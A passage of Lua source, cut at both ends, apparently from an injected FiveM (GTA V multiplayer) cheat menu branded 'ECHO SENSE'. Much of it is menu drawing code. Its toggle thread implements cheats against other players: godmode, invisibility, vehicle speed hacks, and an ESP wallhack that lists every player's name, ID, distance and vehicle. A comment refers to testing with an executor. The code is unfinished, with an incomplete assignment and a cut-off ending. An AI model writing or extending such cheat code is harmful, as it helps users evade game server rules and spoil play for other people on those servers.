			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false
		)
		
		-- DrawSpriteScaled("mparrow", "mp_arrowlarge", x + menuWidth / 2.25, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)			

		DrawSpriteScaled("pilotschool", "hudarrow", x + menuWidth / 2.03 - frameWidth / 2 - sliderWidth, y + separatorHeight / 2, 0.008, nil, -90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
		
		-- Selection Text
		drawText(
			selectedIndex,
			textX,
			y - separatorHeight - (buttonHeight / 2 - fontHeight / 2) ,
			buttonFont,
			subTextColor,
			buttonScale,
			selected,
			false,
			not selected
		)	
		DrawSpriteScaled("pilotschool", "hudarrow", x + menuWidth / 2.15, y + separatorHeight / 2, 0.008, nil, 90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
	end
end

-- Invokes NotifyNewThread
function takytemamrad.SendNotification(options)
	local InvokeNotification = function() return NotifyNewThread(options) end
	-- Delegate coroutine
	CreateThread(InvokeNotification) 
end

function takytemamrad.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "ECHO~b~SENSE"
	menus[id].branding = "~c~ECHO~s~SENSE"
	menus[id].version = "Version 0.002"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.77
    menus[id].y = 0.25
    
    menus[id].width = menuWidth

	menus[id].currentOption = 1
	menus[id].storedOption = 1 -- This is used when going back to previous menu
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 4
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].background = "sprite"
    menus[id].titleBackgroundColor = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 180}
    menus[id].titleBackgroundSprite = {dict = "commonmenu", name = "interaction_bgd"}

	
	menus[id].menuTextColor = {r = 220, g = 220, b = 220, a = 255}
	menus[id].menuSubTextColor = {r = 140, g = 140, b = 140, a = 255}
	
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuFocusBackgroundColor = {r = 25, g = 25, b = 28, a = 240} -- rgb(31, 32, 34) rgb(155, 89, 182) #9b59b6
	menus[id].menuFocusPointerColor = {r = 255, g = 255, b = 255, a = 128}

	menus[id].menuBackgroundColor = {r = 12, g = 12, b = 24, a = 240} -- #121212
	menus[id].menuFrameColor = {r = _menuColor.base.menu.frame.r, g = _menuColor.base.menu.frame.g, b = _menuColor.base.menu.frame.b, a = 255}
	menus[id].menuInvisibleColor = { r = 0, g = 0, b = 0, a = 0 }

	menus[id].buttonSubBackgroundColor = {r = 35, g = 39, b = 40, a = 255}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5
end

function takytemamrad.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		takytemamrad.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
		
		setMenuProperty(id, "buttonSubBackgroundColor", menus[parent].buttonSubBackgroundColor)
	end
end

function takytemamrad.CurrentMenu()
	return currentMenu
end

function takytemamrad.OpenMenu(id)
	if id and menus[id] then
		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end
		
		setMenuVisible(id, true)
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
	end
end

function takytemamrad.IsMenuOpened(id)
	return isMenuVisible(id)
end

function takytemamrad.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function takytemamrad.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function takytemamrad.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
		end
	end
end

function takytemamrad.Button(text, subText, color, subcolor)

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText, color, subcolor)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			end
		end

		return false
	end

end

-- Button with a slider
function takytemamrad.Slider(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 2
	end

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if takytemamrad.SliderInternal(text, items, itemsCount, selectedIndex) then
		callback(selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == keys.right then
            if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end
	
	callback(selectedIndex)
	return false
end

local function drawButtonSlider(text, items, itemsCount, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if (menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].maxOptionCount) then
		multiplier = optionCount
	elseif (optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].currentOption) then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		end

		local sliderColorBase = menus[currentMenu].buttonSubBackgroundColor
		local sliderColorKnob = {r = 90, g = 90, b = 90, a = 255}
		local sliderColorText = {r = 206, g = 206, b = 206, a = 200}

		if selectedIndex > 1 then
			sliderColorBase = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 50}
			sliderColorKnob = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 140}
			sliderColorText = {r = _menuColor.base.r + 20, g = _menuColor.base.g + 20, b = _menuColor.base.b + 20, a = 255}
		end

		local sliderOverlayWidth = sliderWidth / (itemsCount - 1)
		
		-- Button
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor) -- Button Rectangle -2.15
		-- Button text
		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text
		-- Slider left
        drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y, sliderWidth, sliderHeight, sliderColorBase)
		-- Slider right
		drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - (sliderOverlayWidth / 2) * (itemsCount - selectedIndex), y, sliderOverlayWidth * (itemsCount - selectedIndex), sliderHeight, menus[currentMenu].buttonSubBackgroundColor)
		-- Slider knob
		drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth + (sliderOverlayWidth * (selectedIndex - 1)), y, knobWidth, knobHeight, sliderColorKnob)
		-- Slider value text
		drawText(items[selectedIndex], x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y + separatorHeight / 2 - (buttonHeight / 2 - sliderFontHeight / 2), buttonFont, sliderColorText, sliderFontScale, true, shadow) -- Current Item Text
	end
end

function takytemamrad.SliderInternal(text, items, itemsCount, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButtonSlider(text, items, itemsCount, selectedIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function takytemamrad.MenuButton(text, id)
	if menus[id] then
		if takytemamrad.Button(text, "isMenu") then
			setMenuVisible(id, true)
			return true
		end
	end

	return false
end

function takytemamrad.CheckBox(text, bool, callback)
	local checked = "toggleOff"
	if bool then
		checked = "toggleOn"
	end

	if takytemamrad.Button(text, checked) then
		bool = not bool

		if callback then callback(bool) end

		return true
	end

	return false
end

function takytemamrad.ComboBoxInternal(text, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1
		local isCurrent = menus[currentMenu].currentOption == optionCount
		drawComboBox(text, selectedIndex)
		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end
		return false
	else
		return false
	end
end

function takytemamrad.ComboBox(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 1
		selectedItem = items[selectedIndex]
	end


	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if takytemamrad.ComboBoxInternal(text, selectedItem) then
		callback(selectedIndex, selectedItem)
		return true
	end

	if isCurrent then
		if currentKey == keys.left then
			if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == keys.right then
			if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end

	callback(selectedIndex, selectedItem)

	return false
end


local DrawPlayerInfo = {
	pedHeadshot = false,
	txd = "null",
	handle = nil,
	currentPlayer = -1,
}

function takytemamrad.DrawPlayerInfo(player)
	-- Handles running code only once per user. Will run once per 'SelectedPlayer' change
	if DrawPlayerInfo.currentPlayer ~= player then

		-- Current player selected
		DrawPlayerInfo.currentPlayer = player

		-- Drawing coordinates
		DrawPlayerInfo.mugshotWidth = buttonHeight / aspectRatio
		DrawPlayerInfo.mugshotHeight = DrawPlayerInfo.mugshotWidth * aspectRatio
		DrawPlayerInfo.x = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2 
		DrawPlayerInfo.y = menus[currentMenu].y + titleHeight
		
		-- Player init
		DrawPlayerInfo.playerPed = GetPlayerPed(DrawPlayerInfo.currentPlayer)
		DrawPlayerInfo.playerName = Cya:CheckName(GetPlayerName(DrawPlayerInfo.currentPlayer))

		local function RegisterPedHandle()
			
			if DrawPlayerInfo.handle and IsPedheadshotValid(DrawPlayerInfo.handle) then
		
				DrawPlayerInfo.pedHeadshot = false
				UnregisterPedheadshot(DrawPlayerInfo.handle)
				DrawPlayerInfo.handle = nil
				DrawPlayerInfo.txd = "null"
		
			end
		
			-- Get the ped headshot image.
			DrawPlayerInfo.handle = RegisterPedheadshot(DrawPlayerInfo.playerPed)
		
			while not IsPedheadshotReady(DrawPlayerInfo.handle) or not IsPedheadshotValid(DrawPlayerInfo.handle) do
				Wait(50)
			end
			
			if IsPedheadshotReady(DrawPlayerInfo.handle) and IsPedheadshotValid(DrawPlayerInfo.handle) then
				DrawPlayerInfo.txd = GetPedheadshotTxdString(DrawPlayerInfo.handle)
				DrawPlayerInfo.pedHeadshot = true
			else
				DrawPlayerInfo.pedHeadshot = false
			end
		end
		CreateThreadNow(RegisterPedHandle)
	end
	
	-- Pull coordinates from client (self)
	local client = GetEntityCoords(PlayerPedId())
	local cx, cy, cz = client[1], client[2], client[3]
	-- Pull coordinates from target (player)
	local target = GetEntityCoords(DrawPlayerInfo.playerPed)
	local tx, ty, tz = target[1], target[2], target[3]
	
	-- infoBox = {
	-- 	tostring("Name: " .. Cya:CheckName(GetPlayerName(data))),
	-- 	tostring("Server ID: " .. GetPlayerServerId(data)),
	-- 	tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
	-- 	tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
	-- 	tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
	-- 	tostring("Task: " .. takytemamrad.Game:GetPedStatus(dataPed)),
	-- }

	-- [ NOTE ] refactor infoData into DrawPlayerInfo

	-- Define our infoData table
	local infoData = {}

	-- Get the vehicle model name instead of the label text to support custom vehicles
	local vehicleName = GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(DrawPlayerInfo.playerPed)))
	
	-- Should work, but my local server isn't using MP peds, so I need to test once exec is updated.
	-- using 'playerPed' instead of 'player' for now
	local playerHealth = GetEntityHealth(DrawPlayerInfo.playerPed) - 100

	if playerHealth >= 60 then
		playerHealth = '<font color="#19BD14">'..playerHealth..'</font>'
	elseif playerHealth <= 60 and playerHealth > 30 then
		playerHealth = '<font color="#FFA500">'..playerHealth..'</font>'
	elseif playerHealth <= 30 then
		playerHealth = '<font color="#FF3232">'..playerHealth..'</font>'
	end
	

	local DoesHeHaveGodMode = GetPlayerInvincible(DrawPlayerInfo.playerPed)
	
	--if DoesHeHaveGodMode >= 101 then
	--	DoesHeHaveGodMode = '<font color="#66666A">GODMODE'
	--end

	-- Update player armour every draw
	local playerArmour = GetPedArmour(DrawPlayerInfo.playerPed)

	if playerArmour >= 60 then
		playerArmour = '<font color="#4280C6">'..playerArmour..'</font>'
	elseif playerArmour <= 60 and playerArmour > 30 then
		playerArmour = '<font color="#FFA500">'..playerArmour..'</font>'
	elseif playerArmour <= 30 then
		playerArmour = '<font color="#FF3232">'..playerArmour..'</font>'
	end


	-- Update player distance every draw
	local playerDistance = math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)

	-- Update player coords 
	-- Player IDs
	infoData[1] = {}
	infoData[1][1] = '<font color="#66666A">Server / Local'
	infoData[1][2] = ("~b~%3d ~s~/~p~ %-3d"):format(GetPlayerServerId(DrawPlayerInfo.currentPlayer), DrawPlayerInfo.currentPlayer)

	-- Player Status
	infoData[2]	= {}
	infoData[2][1] = '<font color="#66666A">Status'
	infoData[2][2] = (IsPedDeadOrDying(DrawPlayerInfo.playerPed, 1) and "<font color='#BD2814'>DEAD</font> " or "<font color='#19BD14'>ALIVE</font>")
	
	-- Player Health
	infoData[3] = {}
	infoData[3][1] = '<font color="#66666A">Health'
	infoData[3][2] = IsPedDeadOrDying(DrawPlayerInfo.playerPed, 1) and "<font color='#BD2814'>RIP</font>" or playerHealth or DoesHeHaveGodMode

	-- Player Armour
	infoData[4] = {}
	infoData[4][1] = '<font color="#66666A">Armour'
	infoData[4][2] = playerArmour

	-- Player Distance
	infoData[5] = {}
	infoData[5][1] = '<font color="#66666A">Distance'
	infoData[5][2] = playerDistance

	-- Player Vehicle
	infoData[6] = {}
	infoData[6][1] = '<font color="#66666A">Vehicle'
	infoData[6][2] = vehicleName == '<font color="#66666A"Cannot recognize car' and '<font color="#66666A">Not in vehicle' or vehicleName

	-- Invisible Check
	infoData[7] = {}
	infoData[7][1] = '<font color="#66666A">Invisible'
	infoData[7][2] = 
	

	
	-- local infoData = {
	-- 	tostring("Name: " .. Cya:CheckName(GetPlayerName(data))),
	-- 	tostring("Server ID: " .. GetPlayerServerId(data)),
	-- 	tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
	-- 	tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
	-- 	tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
	-- 	tostring("Task: " .. vehicleName),
	-- }

	
	-- drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + footerHeight / 2, previewWidth, footerHeight, { r = 0, b = 0, g = 0, a = 255 })
	
	-- Header box
	drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight / 2, previewWidth, DrawPlayerInfo.mugshotHeight, { r = 12, g = 12, b = 24, a = 240 })
	drawText(DrawPlayerInfo.playerName, DrawPlayerInfo.x + DrawPlayerInfo.mugshotWidth + buttonTextXOffset / 2 - previewWidth / 2, DrawPlayerInfo.y - separatorHeight + (buttonHeight / 2 - fontHeight / 2), buttonFont, _menuColor.base, buttonScale, false, false)
	
	-- Ped preview
	if DrawPlayerInfo.pedHeadshot == true and IsPedheadshotValid(DrawPlayerInfo.handle) and IsPedheadshotReady(DrawPlayerInfo.handle) then
		DrawSprite(DrawPlayerInfo.txd, DrawPlayerInfo.txd, DrawPlayerInfo.x - previewWidth / 2 + DrawPlayerInfo.mugshotWidth / 2, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight / 2, DrawPlayerInfo.mugshotWidth, DrawPlayerInfo.mugshotHeight, 0.0, 251, 243, 243, 255)
	end
	
	-- Separator
	drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight + separatorHeight / 2, previewWidth, separatorHeight, _menuColor.base)
	
	-- Content
	for i = 1, #infoData do
		local multiplier = i
		local text = infoData[i]
		-- Draw content background
		drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * multiplier - footerHeight / 2, previewWidth, footerHeight, menus[currentMenu].menuBackgroundColor)
		-- Draw info title (left)
		drawText(text[1], DrawPlayerInfo.x - previewWidth / 2 + buttonTextXOffset / 2, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * (multiplier - 1) - separatorHeight + (footerHeight / 2 - fontHeight / 2), buttonFont, menus[currentMenu].menuTextColor, buttonScale, false, false)
		-- Draw info description (right)
		drawPreviewText(tostring(text[2]), DrawPlayerInfo.x + buttonTextXOffset, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * (multiplier - 1) - separatorHeight + (footerHeight / 2 - fontHeight / 2), buttonFont, menus[currentMenu].menuTextColor, buttonScale, false, false, true)
		
	end

end

function takytemamrad.DrawWeaponPreview(index)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	
	if index then
		RequestStreamedTextureDict(t_Weapons[index][4])
		if HasStreamedTextureDictLoaded(t_Weapons[index][4]) then
			drawRect((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			DrawSpriteScaled(t_Weapons[index][4], t_Weapons[index][3], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end

end

function takytemamrad.DrawVehiclePreview(vehClass)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	local class = VehicleClass[vehClass]
	local index = menus[currentMenu].currentOption
	
	if class and index then
		RequestStreamedTextureDict(class[index][2])
		if HasStreamedTextureDictLoaded(class[index][2]) then
			drawRect((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			DrawSpriteScaled(class[index][2], class[index][3] or class[index][1], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end
end

function takytemamrad.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			takytemamrad.CloseMenu()
		else
			SetScriptGfxDrawOrder(15)
			-- drawTitle()
			drawSubTitle()
			drawFooter()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true, true)
				else
					takytemamrad.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function takytemamrad.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function takytemamrad.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function takytemamrad.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function takytemamrad.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function takytemamrad.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function takytemamrad.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function takytemamrad.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function takytemamrad.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function takytemamrad.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function takytemamrad.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function takytemamrad.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function takytemamrad.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function takytemamrad.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

local function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

local function DrawText3DFill(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			break
		end
	end
end

local ptags = {}
-- Thread that handles all menu toggles (Godmode, ESP, etc)
local function MenuToggleThread()
	while isMenuEnabled == true do

		-- Radar/showMinimap
		DisplayRadar(showMinimap, 1)
		Cya.Player.IsInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
		SetPlayerInvincible(PlayerId(), Godmode)
		SetEntityInvincible(PlayerPedId(-1), Godmode)
		SetEntityProofs(
			PlayerPedId(),
			Godmode,
			Godmode,
			Godmode,
			Godmode,
			Godmode
		)
		SetPedCanBeKnockedOffVehicle (ped, 1, Cya.Toggle.VehicleNoFall)
		SetPedCanBeKnockedOffVehicle(PlayerPedId(), Cya.Toggle.VehicleNoFall) 

		SetEntityVisible(PlayerPedId(), not Invisible, 0)

		SetPedCanRagdoll(PlayerPedId(), not RagdollToggle)

		ForceSnowPass(ChciSnih)

-- Funkce if blabla

		if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
		end

		--RequestCollisionAtCoord(GetEntityCoords(selectedPlayerPed), AFKDisable)
		if ZatrubSiDevko and IsPedInAnyVehicle(PlayerPedId(), true) then
			if IsControlPressed(1, 38) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
			elseif IsControlPressed(0, 210) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
			end
		end
		if ZatrubSiDevko2 and IsPedInAnyVehicle(PlayerPedId(), true) then
			if IsControlPressed(1, 38) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 250.0)
			elseif IsControlPressed(0, 210) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
			end
		end

		if Enable_ESP then
			for i = 0, 255 do
				if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
					local pPed = GetPlayerPed(i)
					local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
					local x, y, z = table.unpack(GetEntityCoords(pPed))
					local message = "Name: " ..GetPlayerName(i).. "\nServer ID: " ..GetPlayerServerId(i).. "\nPlayer ID: " .. i ..
					"\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
					if IsPedInAnyVehicle(pPed) then
						local VehName = GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(pPed)))
						message = message .. "\nVeh: " .. VehName
					end
					if  Box_ESP and Enable_ESP then
						local PedCoords = GetOffsetFromEntityInWorldCoords(pPed)
						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
